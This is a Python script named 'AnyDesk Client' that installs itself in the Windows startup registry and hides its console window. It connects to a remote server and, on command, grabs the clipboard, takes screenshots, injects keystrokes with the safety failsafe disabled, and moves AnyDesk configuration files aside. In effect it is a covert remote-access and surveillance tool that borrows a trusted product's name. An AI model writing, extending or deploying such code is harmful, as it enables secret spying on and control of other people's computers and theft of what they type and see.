#!/usr/bin/env python3
"""
AnyDesk Client - Runs in background and connects to server
Automatically starts on Windows startup and reports status to server.
"""

import os
import sys
import socket
import json
import time
import shutil
import platform
import subprocess
import logging
import base64
import io
from pathlib import Path
from datetime import datetime
import threading

# Try to import optional dependencies for advanced features
try:
    import pyautogui
    import pyperclip
    from PIL import ImageGrab
    ADVANCED_FEATURES = True
except ImportError:
    ADVANCED_FEATURES = False
    print("Warning: Advanced features (clipboard, keyboard, screenshot) require: pyautogui, pyperclip, pillow")
    print("Install with: pip install pyautogui pyperclip pillow")


class AnyDeskClient:
    def __init__(self, server_host='localhost', server_port=8888, log_file=None, auth_key=None):
        self.server_host = server_host
        self.server_port = server_port
        self.auth_key = auth_key
        self.client_id = self.get_client_id()
        self.running = True
        self.socket = None
        self.reconnect_delay = 5
        
        # Setup logging
        log_format = '%(asctime)s - %(levelname)s - %(message)s'
        if log_file:
            logging.basicConfig(
                filename=log_file,
                level=logging.INFO,
                format=log_format
            )
        else:
            logging.basicConfig(
                level=logging.INFO,
                format=log_format
            )
        self.logger = logging.getLogger(__name__)
        
    def get_client_id(self):
        """Get unique client identifier."""
        hostname = socket.gethostname()
        username = os.environ.get('USERNAME', 'unknown')
        return f"{hostname}_{username}"
    
    def get_system_info(self):
        """Collect system information."""
        return {
            'client_id': self.client_id,
            'hostname': socket.gethostname(),
            'username': os.environ.get('USERNAME', 'unknown'),
            'os': platform.system(),
            'os_version': platform.version(),
            'timestamp': datetime.now().isoformat()
        }
    
    def get_anydesk_status(self):
        """Check AnyDesk configuration files status."""
        roaming_source = Path(os.environ.get('USERPROFILE', '')) / 'AppData' / 'Roaming' / 'AnyDesk'
        program_data_source = Path('C:\\ProgramData\\AnyDesk')
        
        files_to_check = ['service.conf', 'system.conf', 'user.conf']
        
        status = {
            'roaming': {},
            'programdata': {},
            'files_exist': False
        }
        
        # Check Roaming folder
        if roaming_source.exists():
            for filename in files_to_check:
                file_path = roaming_source / filename
                status['roaming'][filename] = {
                    'exists': file_path.exists(),
                    'size': file_path.stat().st_size if file_path.exists() else 0,
                    'modified': datetime.fromtimestamp(file_path.stat().st_mtime).isoformat() if file_path.exists() else None
                }
        
        # Check ProgramData folder
        if program_data_source.exists():
            for filename in files_to_check:
                file_path = program_data_source / filename
                status['programdata'][filename] = {
                    'exists': file_path.exists(),
                    'size': file_path.stat().st_size if file_path.exists() else 0,
                    'modified': datetime.fromtimestamp(file_path.stat().st_mtime).isoformat() if file_path.exists() else None
                }
        
        status['files_exist'] = any(
            status['roaming'].get(f, {}).get('exists', False) or 
            status['programdata'].get(f, {}).get('exists', False) 
            for f in files_to_check
        )
        
        return status
    
    def move_anydesk_files(self):
        """Move AnyDesk configuration files to backup folders."""
        roaming_source = Path(os.environ.get('USERPROFILE', '')) / 'AppData' / 'Roaming' / 'AnyDesk'
        roaming_destination = roaming_source / 'old'
        
        program_data_source = Path('C:\\ProgramData\\AnyDesk')
        program_data_destination = program_data_source / 'old'
        
        files_to_move = ['service.conf', 'system.conf']
        
        results = {
            'roaming': {},
            'programdata': {},
            'success': True,
            'errors': []
        }
        
        # Process Roaming folder
        if roaming_source.exists():
            Path(roaming_destination).mkdir(parents=True, exist_ok=True)
            for filename in files_to_move:
                source_file = roaming_source / filename
                if source_file.exists():
                    try:
                        shutil.move(str(source_file), str(roaming_destination))
                        results['roaming'][filename] = 'moved'
                    except Exception as e:
                        results['roaming'][filename] = f'error: {str(e)}'
                        results['errors'].append(f"Roaming {filename}: {str(e)}")
                        results['success'] = False
                else:
                    results['roaming'][filename] = 'not_found'
        
        # Process ProgramData folder
        if program_data_source.exists():
            Path(program_data_destination).mkdir(parents=True, exist_ok=True)
            for filename in files_to_move:
                source_file = program_data_source / filename
                if source_file.exists():
                    try:
                        shutil.move(str(source_file), str(program_data_destination))
                        results['programdata'][filename] = 'moved'
                    except Exception as e:
                        results['programdata'][filename] = f'error: {str(e)}'
                        results['errors'].append(f"ProgramData {filename}: {str(e)}")
                        results['success'] = False
                else:
                    results['programdata'][filename] = 'not_found'
        
        return results
    
    def send_message(self, message_type, data):
        """Send message to server."""
        try:
            message = {
                'type': message_type,
                'client_id': self.client_id,
                'data': data,
                'timestamp': datetime.now().isoformat()
            }
            message_json = json.dumps(message) + '\n'
            self.socket.sendall(message_json.encode('utf-8'))
            return True
        except Exception as e:
            self.logger.error(f"Error sending message: {e}")
            try:
                print(f"Error sending message: {e}")
            except:
                pass
            return False
    
    def receive_command(self):
        """Receive and process commands from server."""
        try:
            data = self.socket.recv(4096).decode('utf-8')
            if not data:
                return None
            
            # Handle multiple JSON messages
            for line in data.strip().split('\n'):
                if line:
                    try:
                        command = json.loads(line)
                        return command
                    except json.JSONDecodeError:
                        continue
            return None
        except socket.timeout:
            return None
        except Exception as e:
            self.logger.error(f"Error receiving command: {e}")
            try:
                print(f"Error receiving command: {e}")
            except:
                pass
            return None
    
    def get_clipboard(self):
        """Get clipboard content."""
        if not ADVANCED_FEATURES:
            return {'success': False, 'error': 'Advanced features not available'}
        
        try:
            clipboard_text = pyperclip.paste()
            return {
                'success': True,
                'content': clipboard_text,
                'type': 'text'
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def set_clipboard(self, content):
        """Set clipboard content."""
        if not ADVANCED_FEATURES:
            return {'success': False, 'error': 'Advanced features not available'}
        
        try:
            pyperclip.copy(str(content))
            return {'success': True}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def send_keys(self, keys, interval=0.1):
        """Send keyboard input."""
        if not ADVANCED_FEATURES:
            return {'success': False, 'error': 'Advanced features not available'}
        
        try:
            # Disable pyautogui failsafe for automation
            pyautogui.FAILSAFE = False
            pyautogui.write(keys, interval=interval)
            return {'success': True}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def send_key_combination(self, keys):
        """Send key combination (e.g., 'ctrl+c', 'alt+tab')."""
        if not ADVANCED_FEATURES:
            return {'success': False, 'error': 'Advanced features not available'}
        
        try:
            pyautogui.FAILSAFE = False
            # Parse key combination (format: "ctrl+c" or ["ctrl", "c"])
            if isinstance(keys, str):
                keys = keys.lower().split('+')
            
            pyautogui.hotkey(*keys)
            return {'success': True}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def capture_screen(self):
        """Capture screenshot and return as base64."""
        if not ADVANCED_FEATURES:
            return {'success': False, 'error': 'Advanced features not available'}
        
        try:
            # Capture screen
            screenshot = ImageGrab.grab()
            
            # Convert to bytes
            img_bytes = io.BytesIO()
            screenshot.save(img_bytes, format='PNG')
            img_bytes.seek(0)
            
            # Encode to base64
            img_base64 = base64.b64encode(img_bytes.read()).decode('utf-8')
            
            return {
                'success': True,
                'image': img_base64,
                'format': 'PNG',
                'width': screenshot.width,
                'height': screenshot.height
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def process_command(self, command):
        """Process command from server."""
        cmd_type = command.get('type', '')
        cmd_data = command.get('data', {})
        response_data = {}
        
        if cmd_type == 'get_status':
            response_data = {
                'system_info': self.get_system_info(),
                'anydesk_status': self.get_anydesk_status()
            }
            self.send_message('status_response', response_data)
            
        elif cmd_type == 'move_files':
            response_data = self.move_anydesk_files()
            self.send_message('move_files_response', response_data)
            
        elif cmd_type == 'get_clipboard':
            response_data = self.get_clipboard()
            self.send_message('clipboard_response', response_data)
            
        elif cmd_type == 'set_clipboard':
            content = cmd_data.get('content', '')
            response_data = self.set_clipboard(content)
            self.send_message('clipboard_response', response_data)
            
        elif cmd_type == 'send_keys':
            keys = cmd_data.get('keys', '')
            interval = cmd_data.get('interval', 0.1)
            response_data = self.send_keys(keys, interval)
            self.send_message('keyboard_response', response_data)
            
        elif cmd_type == 'send_key_combination':
            keys = cmd_data.get('keys', '')
            response_data = self.send_key_combination(keys)
            self.send_message('keyboard_response', response_data)
            
        elif cmd_type == 'get_screen':
            response_data = self.capture_screen()
            self.send_message('screenshot_response', response_data)
            
        elif cmd_type == 'ping':
            self.send_message('pong', {'message': 'alive'})
            
        elif cmd_type == 'shutdown':
            self.running = False
            self.send_message('shutdown_response', {'message': 'shutting down'})
            
        else:
            self.send_message('error', {'message': f'Unknown command: {cmd_type}'})
    
    def connect_to_server(self):
        """Connect to server with retry logic."""
        while self.running:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.settimeout(10)
                self.socket.connect((self.server_host, self.server_port))
                self.logger.info(f"Connected to server {self.server_host}:{self.server_port}")
                print(f"Connected to server {self.server_host}:{self.server_port}")
                
                # Send initial registration with authentication
                auth_hash = None
                if self.auth_key:
                    import hashlib
                    auth_hash = hashlib.sha256(self.auth_key.encode()).hexdigest()
                
                self.send_message('register', {
                    'system_info': self.get_system_info(),
                    'anydesk_status': self.get_anydesk_status(),
                    'auth_key': auth_hash
                })
                
                return True
            except Exception as e:
                self.logger.warning(f"Connection failed: {e}. Retrying in {self.reconnect_delay} seconds...")
                print(f"Connection failed: {e}. Retrying in {self.reconnect_delay} seconds...")
                time.sleep(self.reconnect_delay)
        return False
    
    def run(self):
        """Main client loop."""
        self.logger.info(f"AnyDesk Client starting... (ID: {self.client_id})")
        # Only print if console is visible
        try:
            print(f"AnyDesk Client starting... (ID: {self.client_id})")
        except:
            pass  # Console might not be available
        
        while self.running:
            if not self.socket or not self.connect_to_server():
                if not self.running:
                    break
                continue
            
            try:
                # Set socket timeout for internet connections
                self.socket.settimeout(30.0)
                
                # Send periodic heartbeat
                last_heartbeat = time.time()
                heartbeat_interval = 30  # seconds
                
                while self.running:
                    # Check for commands from server
                    command = self.receive_command()
                    if command:
                        self.process_command(command)
                    
                    # Send heartbeat
                    if time.time() - last_heartbeat >= heartbeat_interval:
                        self.send_message('heartbeat', {
                            'system_info': self.get_system_info(),
                            'anydesk_status': self.get_anydesk_status()
                        })
                        last_heartbeat = time.time()
                    
                    time.sleep(0.1)
                    
            except socket.timeout:
                continue
            except Exception as e:
                self.logger.error(f"Error in main loop: {e}")
                try:
                    print(f"Error in main loop: {e}")
                except:
                    pass
                if self.socket:
                    self.socket.close()
                self.socket = None
                time.sleep(self.reconnect_delay)
        
        if self.socket:
            self.socket.close()
        self.logger.info("Client stopped.")
        try:
            print("Client stopped.")
        except:
            pass


def load_config():
    """Load configuration from config.json file."""
    config_path = Path(__file__).parent / 'config.json'
    default_config = {
        'client': {
            'server_host': 'localhost',
            'server_port': 8888,
            'auth_key': None
        }
    }
    
    if config_path.exists():
        try:
            with open(config_path, 'r', encoding='utf-8') as f:
                config = json.load(f)
                # Merge with defaults
                client_config = config.get('client', {})
                return {
                    'server_host': client_config.get('server_host', 'localhost'),
                    'server_port': client_config.get('server_port', 8888),
                    'auth_key': client_config.get('auth_key')
                }
        except Exception as e:
            print(f"Error loading config: {e}, using defaults")
    
    return default_config['client']


def save_config(server_host, server_port, auth_key):
    """Save configuration to config.json file."""
    config_path = Path(__file__).parent / 'config.json'
    
    try:
        # Load existing config or create new
        if config_path.exists():
            with open(config_path, 'r', encoding='utf-8') as f:
                config = json.load(f)
        else:
            config = {'server': {}, 'client': {}}
        
        # Update client config
        config['client'] = {
            'server_host': server_host,
            'server_port': server_port,
            'auth_key': auth_key,
            'heartbeat_interval': 30,
            'reconnect_delay': 5
        }
        
        # Save config
        with open(config_path, 'w', encoding='utf-8') as f:
            json.dump(config, f, indent=4, ensure_ascii=False)
        
        return True
    except Exception as e:
        print(f"Error saving config: {e}")
        return False


def add_to_startup(server_host=None, server_port=None, auth_key=None):
    """Add client to Windows startup. Uses config file if parameters not provided."""
    try:
        import winreg
        
        # Load config if parameters not provided
        config = load_config()
        server_host = server_host if server_host is not None else config['server_host']
        server_port = server_port if server_port is not None else config['server_port']
        auth_key = auth_key if auth_key is not None else config.get('auth_key')
        
        # Save config for future use
        save_config(server_host, server_port, auth_key)
        
        script_path = os.path.abspath(__file__)
        script_dir = os.path.dirname(script_path)
        log_file = os.path.join(script_dir, 'client.log')
        
        # Try to use pythonw.exe for background execution (no console window)
        python_exe = sys.executable
        if python_exe.endswith('python.exe'):
            pythonw_exe = python_exe.replace('python.exe', 'pythonw.exe')
            if os.path.exists(pythonw_exe):
                python_exe = pythonw_exe
        
        # Use HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        
        # Simple command - no parameters needed, reads from config.json
        command = f'"{python_exe}" "{script_path}"'
        
        winreg.SetValueEx(key, "AnyDeskClient", 0, winreg.REG_SZ, command)
        winreg.CloseKey(key)
        
        print(f"Added to Windows startup successfully!")
        print(f"Server: {server_host}:{server_port}")
        if auth_key:
            print(f"Authentication: Enabled")
        print(f"Configuration saved to config.json")
        print(f"Log file: {log_file}")
        return True
    except Exception as e:
        print(f"Error adding to startup: {e}")
        return False


def is_running_as_pythonw():
    """Check if running as pythonw.exe (no console)."""
    return sys.executable.endswith('pythonw.exe') or os.environ.get('PYTHONW', '')

def hide_console():
    """Hide console window on Windows."""
    try:
        if platform.system() == 'Windows':
            import ctypes
            # Get console window handle
            kernel32 = ctypes.windll.kernel32
            user32 = ctypes.windll.user32
            
            # Hide console window
            hwnd = kernel32.GetConsoleWindow()
            if hwnd:
                user32.ShowWindow(hwnd, 0)  # SW_HIDE = 0
    except Exception:
        pass  # Ignore errors

def main():
    """Main entry point."""
    import argparse
    
    # Load default config
    config = load_config()
    
    parser = argparse.ArgumentParser(description='AnyDesk Client')
    parser.add_argument('--server-host', default=None, help='Server hostname or IP address (overrides config)')
    parser.add_argument('--server-port', type=int, default=None, help='Server port (overrides config)')
    parser.add_argument('--auth-key', default=None, help='Authentication key (overrides config)')
    parser.add_argument('--add-startup', action='store_true', help='Add to Windows startup and save config')
    parser.add_argument('--log-file', default=None, help='Log file path (for background execution)')
    parser.add_argument('--show-console', action='store_true', help='Show console window (for debugging)')
    
    args = parser.parse_args()
    
    # Hide console if not explicitly shown and not running as pythonw
    if not args.show_console and not is_running_as_pythonw():
        hide_console()
    
    if args.add_startup:
        # Use provided args or prompt for missing values
        server_host = args.server_host or config['server_host']
        server_port = args.server_port or config['server_port']
        auth_key = args.auth_key or config.get('auth_key')
        
        # If still using defaults, prompt user
        if server_host == 'localhost':
            print("Enter server configuration:")
            server_host = input(f"Server host/IP [{server_host}]: ").strip() or server_host
            port_input = input(f"Server port [{server_port}]: ").strip()
            if port_input:
                server_port = int(port_input)
            auth_key = input("Auth key (optional, press Enter to skip): ").strip() or auth_key
        
        add_to_startup(server_host=server_host, server_port=server_port, auth_key=auth_key)
        return
    
    # Use args if provided, otherwise use config
    server_host = args.server_host or config['server_host']
    server_port = args.server_port or config['server_port']
    auth_key = args.auth_key or config.get('auth_key')
    
    # Default log file location (always use log file for background execution)
    if args.log_file is None:
        script_dir = Path(__file__).parent
        args.log_file = str(script_dir / 'client.log')
    
    # Run client
    client = AnyDeskClient(
        server_host=server_host, 
        server_port=server_port,
        log_file=args.log_file,
        auth_key=auth_key
    )
    
    try:
        client.run()
    except KeyboardInterrupt:
        print("\nShutting down...")
        client.running = False


if __name__ == "__main__":
    main()

